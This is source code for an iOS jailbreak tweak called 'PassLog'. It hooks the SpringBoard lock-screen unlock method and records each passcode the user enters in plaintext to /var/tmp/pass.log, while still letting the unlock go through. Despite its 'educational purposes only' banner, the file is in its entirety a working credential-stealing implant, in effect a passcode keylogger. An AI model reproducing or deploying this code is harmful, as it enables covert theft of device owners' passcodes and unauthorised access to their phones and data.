static void writeToFile(NSString* _string)
{
	NSString *saveDirectory = @"/var/tmp/";
	NSString *path = [saveDirectory stringByAppendingPathComponent:@"pass.log"];

	NSString *string = [NSString stringWithFormat: @"\n%@", _string];

	if (![NSFileManager.defaultManager fileExistsAtPath:path])
	{
		[@"[PassLog] : Use for educational purposes only!" writeToFile:path atomically:NO encoding:NSUTF8StringEncoding error:nil];
	}

	NSFileHandle *myHandle = [NSFileHandle fileHandleForWritingAtPath:path];
	[myHandle seekToEndOfFile];
	[myHandle writeData:[string dataUsingEncoding:NSUTF8StringEncoding]];

	NSLog(@"[PassLog] : Pass saved to %@", path);
}

%hook SBLockScreenManager

-(BOOL)attemptUnlockWithPasscode:(NSString*)arg1 {
	NSLog(@"[PassLog] : %@", arg1);

	writeToFile(arg1);

	return %orig;
}

%end
